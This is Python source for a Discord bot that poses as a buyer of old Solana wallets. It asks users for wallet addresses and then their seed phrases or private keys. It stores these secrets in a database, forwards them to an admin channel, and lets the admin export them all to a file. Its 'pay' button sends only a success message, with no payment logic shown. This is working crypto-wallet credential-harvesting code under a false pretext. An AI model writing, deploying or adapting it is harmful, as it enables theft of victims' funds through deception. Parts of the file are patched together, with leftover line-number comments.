import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import logging
import datetime
import threading
from asyncio import run_coroutine_threadsafe
import sqlite3
import os
import asyncio
from flask import Flask

# Disable Flask/Werkzeug logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=5000)

# ═══════════════════════════════════════════════════════════════
# إعدادات السجلات - عربية ومختصرة
# ═══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s | %(message)s',
    datefmt='%H:%M:%S'
)

# تعطيل سجلات Werkzeug (Flask) لتقليل الضجيج
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

DISCORD_TOKEN = os.getenv('DISCORD_BOT')
SOLANA_RPC_URLS = [
    os.getenv('RPC_URL1'),
    os.getenv('RPC_URL2'),
    os.getenv('RPC_URL3')
]
TARGET_CHANNEL_ID = 1474533342220128256
EMPTY_WALLET_CHANNEL_ID = 1474533488114925691
VALUABLE_WALLET_CHANNEL_ID = 1474566936959385670
USER_CONTENT_CHANNEL_ID = 1474582271221567631
NEW_USER_CHANNEL_ID = 1474582517775597611
ADMIN_IDS = [1455690622412390573]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
from discord import app_commands

# ... (rest of imports)

# ... (around line 59)
bot = commands.Bot(command_prefix=['/', ''], intents=intents, help_command=None)

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} commands successfully!")
    except Exception as e:
        print(f"❌ Sync failed: {e}")
    print(f'Logged in as {bot.user}')

@bot.tree.command(
    name="start", 
    description="Start using the bot"
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def start_slash(interaction: discord.Interaction):
    """امر البداية (Slash Command)"""
    welcome_text = (
        "Welcome.\n\n"
        "Send me the address of the old wallet you want to sell 💰"
    )
    await interaction.response.send_message(welcome_text)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        # Ignore CommandNotFound errors because users often send wallet addresses
        # which can be mistaken for commands if they start with a prefix (or empty prefix)
        return
    raise error

# قاموس لتخزين بيانات المستخدمين والمحافظ المؤقتة
user_wallets = {}
user_states = {}
admin_payment_states = {}
admin_divisor = 1.0
user_divisor = 2.0 # القيمة الافتراضية

def save_user_divisor(value):
    try:
        with open('user_ratio.txt', 'w') as f:
            f.write(str(value))
    except Exception as e:
        logging.error(f"Error saving ratio: {e}")

async def send_to_channel(channel_id, content=None, embed=None, file=None, files=None, view=None):
    channel = bot.get_channel(channel_id)
    if channel and isinstance(channel, discord.abc.Messageable):
        try:
            kwargs = {}
            if content: kwargs['content'] = content
            if embed: kwargs['embed'] = embed
            if file: kwargs['file'] = file
            if files: kwargs['files'] = files
            if view: kwargs['view'] = view
            await channel.send(**kwargs)
        except Exception as e:
            print(f"Error sending to channel {channel_id}: {e}")

async def send_to_target(content=None, embed=None, file=None, files=None, view=None):
    await send_to_channel(TARGET_CHANNEL_ID, content, embed, file, files, view)

def log_wallet_check(user_id, username, wallet_address, sol_value, full_amount=None, is_admin=False, is_custom=False, is_empty=False):
    # Save to addresses.txt for 'فارغ' command
    try:
        with open("addresses.txt", "a", encoding="utf-8") as f:
            f.write(f"{wallet_address}\n")
    except Exception as e:
        logging.error(f"Error saving address to file: {e}")

    # Save to rent.txt if it has rent
    if not is_empty:
        try:
            with open("rent.txt", "a", encoding="utf-8") as f:
                f.write(f"{wallet_address}\n")
        except Exception as e:
            logging.error(f"Error saving rent address to file: {e}")

    log_message = (
        f"🔍 **New Wallet Check**\n\n"
        f"👤 **User**: @{username} \n\n"
        f"🆔 **ID**: `{user_id}`\n\n"
        f"📌 **Wallet**: `{wallet_address}`\n\n"
        f"💎 **Real Amount**: `{full_amount:.4f} SOL`\n"
    )

    if is_custom:
        log_message += f"💵 **User Value**: `{sol_value} SOL` Custom 📊\n"
    else:
        log_message += f"💵 **User Value**: `{sol_value} SOL`\n"

    log_message += f"\n⏰ **Time**: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
    
    target_id = EMPTY_WALLET_CHANNEL_ID if is_empty else VALUABLE_WALLET_CHANNEL_ID
    asyncio.run_coroutine_threadsafe(send_to_channel(target_id, content=log_message), bot.loop)

def log_new_referral(referrer_id, referrer_username, referred_id, referred_username):
    referrer_display = f"@{referrer_username}" if referrer_username else "لا يوجد"
    referred_display = f"@{referred_username}" if referred_username else "لا يوجد"

    referral_message = (
        "✨ **مستخدم جديد عبر الإحالة** 📩\n\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 **المستخدم الجديد:**\n"
        f"🆔 ID: `{referred_id}`\n"
        f"👉 User: {referred_display}\n\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "💎 **عن طريق:**\n"
        f"🆔 ID: `{referrer_id}`\n"
        f"👉 User: {referrer_display}\n\n"
        f"⏰ **الوقت:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
    )
    asyncio.run_coroutine_threadsafe(send_to_target(content=referral_message), bot.loop)

# قاعدة بيانات
DB_PATH = 'users.db'

def init_database():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                    (user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    join_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallet_checks
                    (check_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    wallet_address TEXT,
                    is_empty BOOLEAN,
                    has_rent BOOLEAN,
                    check_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS successful_sales
                    (sale_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    amount REAL,
                    sale_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_activity
                    (user_id INTEGER PRIMARY KEY,
                    last_active TIMESTAMP,
                    check_count INTEGER DEFAULT 0,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_wallets
                    (user_id INTEGER PRIMARY KEY,
                    amount REAL,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS referrals
                    (referrer_id INTEGER,
                    referred_id INTEGER PRIMARY KEY,
                    original_wallet TEXT,
                    reward_wallet TEXT,
                    sale_amount REAL,
                    is_active BOOLEAN DEFAULT FALSE,
                    reward_paid BOOLEAN DEFAULT FALSE,
                    FOREIGN KEY(referrer_id) REFERENCES users(user_id),
                    FOREIGN KEY(referred_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS reward_requests
                    (request_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    reward_wallet TEXT,
                    amount REAL,
                    status TEXT DEFAULT 'pending',
                    request_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallet_prices
                    (wallet_address TEXT PRIMARY KEY,
                    custom_price REAL,
                    set_by_admin INTEGER,
                    created_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(set_by_admin) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS blocked_users
                    (user_id INTEGER PRIMARY KEY,
                    blocked_by_admin INTEGER,
                    blocked_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reason TEXT,
                    FOREIGN KEY(blocked_by_admin) REFERENCES users(user_id))''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS user_keys
                    (key_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    username TEXT,
                    key_data TEXT,
                    key_type TEXT,
                    submit_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id))''')
    conn.commit()
    conn.close()

def add_user(user_id, username, first_name, last_name):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Check if user already exists
    cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
    exists = cursor.fetchone()
    
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, join_time) VALUES (?, ?, ?, ?, COALESCE((SELECT join_time FROM users WHERE user_id = ?), CURRENT_TIMESTAMP))",
                   (user_id, username, first_name, last_name, user_id))
    conn.commit()
    conn.close()
    
    if not exists:
        user_display = f"@{username}" if username else f"{first_name or ''} {last_name or ''}".strip() or "Unknown"
        new_user_msg = (
            "🆕 **مستخدم جديد انضم للبوت**\n\n"
            f"👤 **الأسم/اليوزر:** {user_display}\n"
            f"🆔 **الايدي:** `{user_id}`\n"
            f"⏰ **الوقت:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"
        )
        asyncio.run_coroutine_threadsafe(send_to_channel(NEW_USER_CHANNEL_ID, content=new_user_msg), bot.loop)

def is_user_blocked(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM blocked_users WHERE user_id = ?", (user_id,))
    blocked = cursor.fetchone() is not None
    conn.close()
    return blocked

def check_tables_exist():
    init_database()

@bot.event
async def on_ready_old(): # Renaming old print if any
    print(f'Logged in as {bot.user}')

def extract_wallets(text):
    """استخراج عناوين المحافظ من النص"""
    wallet_pattern = r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b'
    wallets = re.findall(wallet_pattern, text)
    return [w.strip() for w in wallets if 32 <= len(w.strip()) <= 44]

def get_custom_price(wallet_address):
    """الحصول على السعر المخصص للمحفظة إن وجد"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT custom_price FROM wallet_prices WHERE wallet_address = ?', (wallet_address,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else None
    except Exception as e:
        logging.error(f"Error getting custom price: {e}")
        return None

def process_wallet_check_sync(user_id, username, wallet, is_admin=False):
    """النسخة المتزامنة من فحص المحفظة لتعمل مع Discord"""
    try:
        solana_apis = [url for url in SOLANA_RPC_URLS if url]
        if not solana_apis:
             solana_apis = ["https://api.mainnet-beta.solana.com"]

        token_programs = [
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
        ]

        headers = {"Content-Type": "application/json"}
        all_accounts = []

        for program_id in token_programs:
            data = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getTokenAccountsByOwner",
                "params": [wallet, {"programId": program_id}, {"encoding": "jsonParsed"}]
            }
            for api in solana_apis:
                try:
                    response = requests.post(api, json=data, headers=headers, timeout=10)
                    result = response.json()
                    if "result" in result and "value" in result["result"]:
                        all_accounts.extend(result["result"]["value"])
                    break
                except:
                    continue

        total_rent = len(all_accounts) * 0.00203928
        custom_price = get_custom_price(wallet)
        
        # تحميل النسبة من الملف أو القيمة الافتراضية
        try:
            with open('user_ratio.txt', 'r') as f:
                current_user_divisor = float(f.read().strip())
        except:
            current_user_divisor = 2.0

        if custom_price:
            user_sol_value = custom_price
        else:
            user_sol_value = round(total_rent / current_user_divisor, 5)

        is_empty = user_sol_value < 0.000699
        has_rent = not is_empty

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO wallet_checks (user_id, wallet_address, is_empty, has_rent) VALUES (?, ?, ?, ?)', 
                       (user_id, wallet, is_empty, has_rent))
        cursor.execute('''INSERT OR REPLACE INTO user_activity
                         (user_id, last_active, check_count)
                         VALUES (?, CURRENT_TIMESTAMP,
                                 COALESCE((SELECT check_count FROM user_activity WHERE user_id = ?), 0) + 1)''',
                      (user_id, user_id))
        conn.commit()
        conn.close()

        return {
            "wallet": wallet,
            "total_rent": total_rent,
            "user_sol_value": user_sol_value,
            "is_custom": custom_price is not None,
            "is_empty": is_empty
        }
    except Exception as e:
        logging.error(f"process_wallet_check_sync error: {e}")
        return None

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if is_user_blocked(message.author.id):
        return

    # Forward to target channel
    user_id = message.author.id
    username = str(message.author)
    first_name = message.author.global_name or message.author.name
    last_name = ""
    
    # Add user to database if not exists
    add_user(user_id, message.author.name, message.author.global_name or message.author.name, "")

    # Welcome new users in DMs if they haven't sent a wallet or command
    if isinstance(message.channel, discord.DMChannel) and not extract_wallets(message.content) and not message.content.startswith('/'):
        welcome_text = (
            "Welcome.\n\n"
            "Send me the address of the old wallet you want to sell 💰"
        )
        await message.reply(welcome_text)
        return
    info_text = f"👤 **User**: {username} (ID: `{user_id}`)\n"

    content_lower = message.content.lower().strip()

    if message.author.id in ADMIN_IDS:
        content_lower = message.content.lower().strip()
        
        if content_lower == 'مستخدمين':
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                
                # 1. Total users
                cursor.execute("SELECT COUNT(*) FROM users")
                total_users = cursor.fetchone()[0]
                
                # 2. User growth (24h, week, month)
                now = datetime.datetime.now()
                day_ago = (now - datetime.timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
                week_ago = (now - datetime.timedelta(weeks=1)).strftime('%Y-%m-%d %H:%M:%S')
                month_ago = (now - datetime.timedelta(days=30)).strftime('%Y-%m-%d %H:%M:%S')
                
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (day_ago,))
                users_24h = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (week_ago,))
                users_week = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM users WHERE join_time >= ?", (month_ago,))
                users_month = cursor.fetchone()[0]
                
                # 3. Wallet checks (24h, week, month, total)
                cursor.execute("SELECT COUNT(*) FROM wallet_checks")
                checks_total = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (day_ago,))
                checks_24h = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (week_ago,))
                checks_week = cursor.fetchone()[0]
                cursor.execute("SELECT COUNT(*) FROM wallet_checks WHERE check_time >= ?", (month_ago,))
                checks_month = cursor.fetchone()[0]
                
                # 4. Successful sales (24h, week, month)
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (day_ago,))
                res_24h = cursor.fetchone()
                sales_24h_count = res_24h[0] or 0
                sales_24h_sum = res_24h[1] or 0.0
                
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (week_ago,))
                res_week = cursor.fetchone()
                sales_week_count = res_week[0] or 0
                sales_week_sum = res_week[1] or 0.0
                
                cursor.execute("SELECT COUNT(*), SUM(amount) FROM successful_sales WHERE sale_time >= ?", (month_ago,))
                res_month = cursor.fetchone()
                sales_month_count = res_month[0] or 0
                sales_month_sum = res_month[1] or 0.0
                
                # 5. Top 10 Referrers
                cursor.execute("""
                    SELECT r.referrer_id, u.username, COUNT(*) as ref_count 
                    FROM referrals r
                    JOIN users u ON r.referrer_id = u.user_id
                    GROUP BY r.referrer_id
                    ORDER BY ref_count DESC
                    LIMIT 10
                """)
                top_referrers = cursor.fetchall()
                referrers_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_referrers]) if top_referrers else "لا يوجد بيانات حالياً"
                
                # 6. Top Active Users
                cursor.execute("""
                    SELECT ua.user_id, u.username, ua.check_count 
                    FROM user_activity ua
                    JOIN users u ON ua.user_id = u.user_id
                    ORDER BY ua.check_count DESC
                    LIMIT 10
                """)
                top_active = cursor.fetchall()
                active_text = "\n".join([f"├ @{row[1] or row[0]}: {row[2]}" for row in top_active]) if top_active else "لا يوجد بيانات حالياً"
                
                conn.close()
                
                stats_msg = (
                    "📊 إحصائيات شاملة للبوت\n"
                    "━━━━━━━━━━━━━━━━\n"
                    f"👥 عدد المستخدمين الكلي: {total_users}\n\n"
                    "📈 عدد زيادة المستخدمين\n"
                    f"├ 24 ساعة: {users_24h}\n"
                    f"├ أسبوع: {users_week}\n"
                    f"└ شهر: {users_month}\n\n"
                    "🔍 المحافظ المفحوصة\n"
                    f"├ 24 ساعة: {checks_24h}\n"
                    f"├ أسبوع: {checks_week}\n"
                    f"├ شهر: {checks_month}\n"
                    f"└ الكل: {checks_total}\n\n"
                    "💰 المبيعات الناجحة\n"
                    f"├ 24 ساعة: {sales_24h_count} ({sales_24h_sum:.2f} SOL)\n"
                    f"├ أسبوع: {sales_week_count} ({sales_week_sum:.2f} SOL)\n"
                    f"└ شهر: {sales_month_count} ({sales_month_sum:.2f} SOL)\n\n"
                    "🏆 أفضل 10 محيلين\n"
                    f"{referrers_text}\n"
                    "🌟 أكثر المستخدمين تفاعلاً\n"
                    f"{active_text}\n"
                    f"🔄 آخر تحديث: {now.strftime('%Y-%m-%d %H:%M')}"
                )
                
                await message.reply(stats_msg)
            except Exception as e:
                await message.reply(f"❌ حدث خطأ أثناء جلب الإحصائيات: {e}")
            return

        if content_lower == 'بيانات':
            embed = discord.Embed(
                title="🗄️ إدارة قاعدة البيانات",
                description="اختر أحد الخيارات التالية للتحكم في ملفات البيانات:",
                color=discord.Color.blue()
            )
            
            view = discord.ui.View()
            
            # زر التحميل
            download_btn = discord.ui.Button(label="تحميل النسخة الاحتياطية", style=discord.ButtonStyle.success, emoji="📥")
            async def download_callback(interaction):
                files = []
                for filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt', 'keys.txt']:
                    if os.path.exists(filename):
                        files.append(discord.File(filename))
                
                if files:
                    await interaction.response.send_message("✅ جاري تحضير الملفات...", ephemeral=True)
                    await interaction.followup.send("إليك نسخة من ملفات قاعدة البيانات الحالية:", files=files)
                else:
                    await interaction.response.send_message("❌ لم يتم العثور على أي ملفات بيانات.", ephemeral=True)
            
            # زر الرفع
            upload_btn = discord.ui.Button(label="رفع ملفات جديدة", style=discord.ButtonStyle.primary, emoji="📤")
            async def upload_callback(interaction):
                user_states[interaction.user.id] = "waiting_for_db_upload"
                await interaction.response.send_message("📤 أرسل الآن الملفات التي تريد استبدالها (users.db, addresses.txt, إلخ...)", ephemeral=True)
            
            download_btn.callback = download_callback
            upload_btn.callback = upload_callback
            view.add_item(download_btn)
            view.add_item(upload_btn)
            
            await message.reply(embed=embed, view=view)
            return

        if content_lower == 'عبارات ومفاتيح':
            try:
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                
                # Fetch seeds (assuming key_type might be 'seed' or similar, let's get all and format)
                cursor.execute("SELECT key_data, key_type FROM user_keys")
                rows = cursor.fetchall()
                conn.close()
                
                seeds = [row[0] for row in rows if len(row[0].split()) in [12, 15, 18, 21, 24]]
                privkeys = [row[0] for row in rows if row[0] not in seeds]
                
                content = "🔑 **العبارات السرية (Seeds):**\n\n"
                content += "\n\n".join(seeds)
                content += "\n\n" + "="*30 + "\n\n"
                content += "🔐 **المفاتيح الخاصة (Private Keys):**\n\n"
                content += "\n\n".join(privkeys)
                
                with open("keys.txt", "w", encoding="utf-8") as f:
                    f.write(content)
                
                await message.reply(file=discord.File("keys.txt"))
            except Exception as e:
                await message.reply(f"❌ حدث خطأ أثناء استخراج البيانات: {e}")
            return

        state = user_states.get(user_id)
        
        if state == "waiting_for_db_upload" and message.attachments:
            for attachment in message.attachments:
                try:
                    # التحقق من اسم الملف قبل الحفظ لضمان الأمان
                    if attachment.filename in ['users.db', 'addresses.txt', 'rent.txt', 'user_ratio.txt']:
                        await attachment.save(attachment.filename)
                        await message.reply(f"✅ تم تحديث الملف: `{attachment.filename}` بنجاح.")
                    else:
                        await message.reply(f"⚠️ الملف `{attachment.filename}` غير مدعوم. يرجى رفع ملفات النظام فقط.")
                except Exception as e:
                    await message.reply(f"❌ فشل رفع `{attachment.filename}`: {e}")
            
            user_states.pop(user_id, None)
            return

        if content_lower == 'rr':
            await message.reply("👤 أرسل الآن ID المستخدم الذي تريد مراسلته:")
            user_states[user_id] = "waiting_for_rr_id"
            return

        if state == "waiting_for_rr_id":
            if content_lower.isdigit():
                user_states[user_id] = f"waiting_for_rr_msg_{content_lower}"
                await message.reply(f"📝 جاري المراسلة لـ `{content_lower}`\nأرسل الآن نص الرسالة:")
            else:
                await message.reply("❌ خطأ: يرجى إرسال ID صحيح (أرقام فقط):")
            return

        if state and state.startswith("waiting_for_rr_msg_"):
            target_id = int(state.replace("waiting_for_rr_msg_", ""))
            try:
                user = await bot.fetch_user(target_id)
                
                embed = discord.Embed(
                    title="Message from Admin", 
                    description=message.content, 
                    color=discord.Color.blue(),
                    timestamp=datetime.datetime.now()
                )
                embed.set_footer(text="Admin Support")
                
                # Setup user view for their side
                user_view = discord.ui.View()
                u_reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
                u_end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)

                async def u_reply_cb(interaction):
                    # Hide buttons after reply
                    await interaction.response.edit_message(view=None)
                    await interaction.followup.send("Please send your reply now:", ephemeral=True)
                    user_states[interaction.user.id] = "waiting_for_user_reply"

                async def u_end_cb(interaction):
                    # Hide buttons after ending
                    await interaction.response.edit_message(view=None)
                    await interaction.followup.send("Conversation ended.", ephemeral=True)
                    user_states.pop(interaction.user.id, None)

                u_reply_btn.callback = u_reply_cb
                u_end_btn.callback = u_end_cb
                user_view.add_item(u_reply_btn)
                user_view.add_item(u_end_btn)

                await user.send(embed=embed, view=user_view)
                
                admin_confirm_view = discord.ui.View()
                admin_reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
                admin_end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)

                async def a_reply_cb(interaction):
                    # Hide buttons after admin reply
                    await interaction.response.edit_message(view=None)
                    await interaction.followup.send(f"Please send your message for user `{target_id}` now:", ephemeral=True)
                    user_states[interaction.user.id] = f"waiting_for_rr_msg_{target_id}"

                async def a_end_cb(interaction):
                    # Hide buttons after admin ends
                    await interaction.response.edit_message(view=None)
                    try:
                        u = await bot.fetch_user(target_id)
                        await u.send("The admin has ended the conversation.")
                    except: pass
                    await interaction.followup.send("Conversation ended.", ephemeral=True)
                    user_states.pop(target_id, None)

                admin_reply_btn.callback = a_reply_cb
                admin_end_btn.callback = a_end_cb
                
                admin_confirm_view = discord.ui.View()
                admin_confirm_view.add_item(admin_reply_btn)
                admin_confirm_view.add_item(admin_end_btn)

                await message.reply(f"✅ Message sent to `{target_id}` successfully.")
                user_states.pop(user_id, None)
                # Set user state to wait for their reply to show buttons then
                user_states[target_id] = "waiting_for_user_reply"
            except Exception as e:
                await message.reply(f"❌ Failed to send: {e}")
                user_states.pop(user_id, None)
            return

    # 1. Check if it's a selling request (contains wallets and potentially keys/seeds)
    wallets = extract_wallets(message.content)
    content_lower = message.content.lower().strip()
    is_seed = len(content_lower.split()) in [12, 15, 18, 21, 24]
    is_privkey = len(content_lower) in [87, 88, 128] or (len(content_lower) > 60 and " " not in content_lower and not wallets)
    
    # 2. Forward to appropriate channel
    if wallets or is_seed or is_privkey:
        # This is a selling/wallet related message - handled by existing logic or goes to TARGET_CHANNEL_ID
        pass 
    elif message.content:
        content_lower = message.content.lower().strip()
        # Avoid double forwarding if it is a command
        is_command = content_lower.startswith(('/', '!', '.')) or any(content_lower == cmd for cmd in ['عبارات ومفاتيح', 'عناوين', 'فحص', 'فارغ', 'blocklist', 'ratios', 'pay', 'broadcast'])
        
        state = user_states.get(message.author.id)
        if state == "waiting_for_user_reply":
            # Forward user reply back to admin with buttons for admin to reply or end
            admin_msg = f"📩 **New Reply from User** (ID: `{message.author.id}`):\n{message.content}"
            
            admin_view = discord.ui.View()
            reply_btn = discord.ui.Button(label="Reply", style=discord.ButtonStyle.primary)
            end_btn = discord.ui.Button(label="End Conversation", style=discord.ButtonStyle.danger)

            async def admin_reply_callback(interaction):
                # Hide buttons after admin reply
                await interaction.response.edit_message(view=None)
                await interaction.followup.send(f"Please send your message for user `{message.author.id}` now:", ephemeral=True)
                user_states[interaction.user.id] = f"waiting_for_rr_msg_{message.author.id}"

            async def admin_end_callback(interaction):
                # Hide buttons after admin ends
                await interaction.response.edit_message(view=None)
                try:
                    user = await bot.fetch_user(message.author.id)
                    await user.send("The admin has ended the conversation.")
                except: pass
                await interaction.followup.send("Conversation ended.", ephemeral=True)
                user_states.pop(message.author.id, None)

            reply_btn.callback = admin_reply_callback
            end_btn.callback = admin_end_callback
            admin_view.add_item(reply_btn)
            admin_view.add_item(end_btn)

            for admin_id in ADMIN_IDS:
                try:
                    admin = await bot.fetch_user(admin_id)
                    await admin.send(admin_msg, view=admin_view)
                except Exception as e:
                    logging.error(f"Error forwarding reply to admin {admin_id}: {e}")
            
            # Inform user that their message was sent
            # Update previous message to hide buttons if possible, or just send a clear response
            await message.reply("✅ Your reply has been sent to the Admin.")
            return

        if not is_command:
            # This is a general message - forward to USER_CONTENT_CHANNEL_ID
            forward_text = f"{info_text}"
            forward_text += f"💬 **Message**: {message.content}"
            
            if message.attachments:
                for attachment in message.attachments:
                    forward_text += f"\n📎 **Attachment**: {attachment.url}"
            
            asyncio.run_coroutine_threadsafe(send_to_channel(USER_CONTENT_CHANNEL_ID, content=forward_text), bot.loop)
            return # IMPORTANT: Stop processing this message further so it doesn't hit other logic

    # Remove the old SECOND_TARGET_CHANNEL_ID logic that was below

    # 290→    if message.author.id in ADMIN_IDS:
    # 291→        admin_state = admin_payment_states.get(message.author.id)
    # ...
    # 335→    # Handle states like waiting for wallet FIRST
    # ...
    # 423→        if message.author.id in ADMIN_IDS:
    # 424→            content = message.content.strip()

    # ═══════════════════════════════════════════════════════════════
    # Logic for handling specific states (waiting for wallet, etc.)
    # ═══════════════════════════════════════════════════════════════
    # state = user_states.get(user_id) # Moved up inside on_message

    # Check for keys/seeds regardless of state to ensure they are captured
    content_lower = message.content.lower().strip()
    is_seed = len(content_lower.split()) in [12, 15, 18, 21, 24]
    is_privkey = len(content_lower) in [87, 88, 128] or (len(content_lower) > 60 and " " not in content_lower and not extract_wallets(content_lower))

    if is_seed or is_privkey:
        key_type = "seed" if is_seed else "private_key"
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO user_keys (user_id, username, key_data, key_type) VALUES (?, ?, ?, ?)",
                           (user_id, username, message.content, key_type))
            conn.commit()
            conn.close()
            
            # Log the final request to target channel
            pending_data = user_wallets.get(user_id)
            if pending_data:
                original_wallet = pending_data.get("original_wallet")
                reward_wallet = pending_data.get("reward_wallet")
                real_amount = pending_data.get("amount", 0)
                
                # Get user value using the same logic as process_wallet_check_sync
                try:
                    with open('user_ratio.txt', 'r') as f:
                        current_user_divisor = float(f.read().strip())
                except:
                    current_user_divisor = 2.0
                
                user_value = round(real_amount / current_user_divisor, 5)
                
                final_request_msg = (
                    f"📌 New Request\n\n"
                    f"👤 User ID: {user_id}\n"
                    f"👤 Username: @{message.author.name}\n\n"
                    f"🔹 Original Wallet:\n{original_wallet}\n\n"
                    f"🔸 Reward Wallet:\n{reward_wallet}\n\n"
                    f"🔐 Private Key/Seed:\n{message.content}\n\n"
                    f"💰 Real Amount: {real_amount:.4f} SOL\n"
                    f"💵 User Value: {user_value:.5f} SOL\n"
                    f"🕒 Time: {datetime.datetime.now().strftime('%I:%M %p')}"
                )
                
                # Add Pay button for admin
                pay_view = discord.ui.View()
                pay_btn = discord.ui.Button(label="pay", style=discord.ButtonStyle.green)
                
                async def pay_callback(interaction):
                    # Notify user
                    success_msg = (
                        "🎊 Congratulations! The transaction was successful\n\n"
                        "Your request has been processed and funds have been sent to your wallet. Thank you for your trust! If you have more wallets, we are always here for you!\n\n"
                        "🎁 When you sell wallets with a total value of 10 SOL, you will receive a 1 SOL bonus."
                    )
                    try:
                        target_user = await bot.fetch_user(user_id)
                        await target_user.send(success_msg)
                        await interaction.response.send_message(f"✅ Payment notification sent to user {user_id}", ephemeral=True)
                    except Exception as e:
                        await interaction.response.send_message(f"❌ Could not send DM to user {user_id}: {e}", ephemeral=True)
                
                pay_btn.callback = pay_callback
                pay_view.add_item(pay_btn)
                
                asyncio.run_coroutine_threadsafe(send_to_target(content=final_request_msg, view=pay_view), bot.loop)

            if state == "waiting_for_key":
                await message.reply("✅ Your request is being processed. Please wait for admin approval.")
                user_states.pop(user_id, None)
                return
        except Exception as e:
            logging.error(f"Error saving key: {e}")

    if state == "waiting_for_reward_wallet":
        # Check if the message is a wallet address
        wallets = extract_wallets(message.content)
        if wallets:
            reward_wallet = wallets[0]
            # Verify it's different from the original wallet
            pending_data = user_wallets.get(user_id)
            if pending_data and reward_wallet == pending_data.get("original_wallet"):
                await message.reply("❌ The receiving wallet must be different from the selling wallet. Please provide a different address:")
                return

            # Save the reward wallet and update state
            if user_id in user_wallets:
                user_wallets[user_id]["reward_wallet"] = reward_wallet
            
            await message.reply(f"✅ Receiving wallet saved:\n`{reward_wallet}`\n\nYour request is being processed. Please wait for admin approval.")
            user_states[user_id] = "waiting_for_key"
            
            # Here you would typically log this to the admin channel or update DB
